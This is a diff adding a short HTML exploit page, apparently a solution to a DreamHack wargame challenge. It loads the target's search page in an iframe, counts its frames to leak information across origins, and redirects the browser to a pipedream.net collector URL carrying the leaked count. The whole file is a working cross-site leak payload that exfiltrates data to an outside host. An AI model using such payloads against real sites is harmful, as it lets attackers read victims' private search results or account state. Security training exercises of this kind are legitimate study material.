@@ -1,0 +1,10 @@
+<iframe src></iframe>
+<img id="img">
+<script>
+    var iframe = document.createElement("iframe");
+    iframe.src = "http://host3.dreamhack.games:8825/search?query=DreamHack";
+    document.body.appendChild(iframe);
+    iframe.onload = ()=>{console.log(iframe.contentWindow.frames.length);};
+    //()=>{console.log(iframe.contentWindow.frames.length);}
+    window.location="http://en7007nj6j2rg.x.pipedream.net/?count="+iframe.contentWindow.frames.length
+</script>
